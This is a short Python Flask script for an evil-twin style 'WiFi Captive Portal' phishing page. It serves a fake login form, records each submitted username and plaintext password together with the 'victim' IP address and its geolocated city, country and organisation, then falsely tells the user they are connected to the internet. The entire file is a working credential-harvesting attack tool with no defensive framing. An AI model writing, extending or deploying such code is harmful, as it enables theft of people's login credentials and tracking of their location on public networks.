import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from flask import Flask, request, render_template
from core.logger import log_event
from core.ip_locator import get_ip_info  # ✅ Import IP Locator

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        victim_ip = request.remote_addr

        ip_info = get_ip_info(victim_ip)  # ✅ Get geo-info

        log_event({
            "module": "WiFi Captive Portal",
            "ip": victim_ip,
            "city": ip_info.get("city"),
            "country": ip_info.get("country"),
            "org": ip_info.get("org"),
            "username": username,
            "password": password
        })

        return "<h3>Thank you! You are now connected to the internet.</h3>"

    return render_template('login.html')  # 👈 This should be your phishing login.html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

